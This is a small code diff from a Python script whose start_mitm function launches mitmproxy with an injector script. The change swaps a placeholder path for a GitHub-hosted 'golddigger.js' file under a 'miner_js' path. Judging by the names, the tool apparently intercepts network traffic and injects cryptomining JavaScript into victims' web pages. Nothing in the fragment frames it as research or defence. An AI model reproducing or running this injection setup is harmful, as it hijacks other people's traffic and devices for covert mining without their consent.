@@ -6,7 +6,7 @@ import requests
 import os
 
 def start_mitm():
-    os.system("~/.local/bin/mitmdproxy -s '' 'injector.py http://path/to/miner_js.js' -T")
+    os.system("~/.local/bin/mitmproxy -s 'cert *=cert.pem' 'injector.py  https://github.com/johnbomba/wifi_m/miner_js/golddigger.js ' -T")
     return True
     
 def get_cert(path, basename):
